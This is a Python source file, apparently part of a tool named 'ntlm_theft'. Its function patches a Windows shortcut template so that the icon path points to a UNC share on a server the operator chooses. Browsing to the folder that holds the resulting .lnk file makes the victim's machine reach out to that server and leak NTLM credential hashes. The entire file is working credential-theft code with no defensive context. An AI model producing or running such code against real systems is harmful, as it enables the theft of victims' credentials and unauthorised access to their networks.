#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
from ntlm_theft.files import script_directory


def create_lnk(generate, server, filename):
    offset = 0x136
    max_path = 0xDF
    unc_path = f"\\\\{server}\\tools\\nc.ico"
    if len(unc_path) >= max_path:
        print("Server name too long for lnk template, skipping.")
        return
    unc_path = unc_path.encode("utf-16le")
    with open(
        os.path.join(script_directory, "templates", "shortcut-template.lnk"), "rb"
    ) as lnk:
        shortcut = list(lnk.read())
    for i in range(0, len(unc_path)):
        shortcut[offset + i] = unc_path[i]
    with open(filename, "wb") as file:
        file.write(bytes(shortcut))
    print("Created: " + filename + " (BROWSE TO FOLDER)")
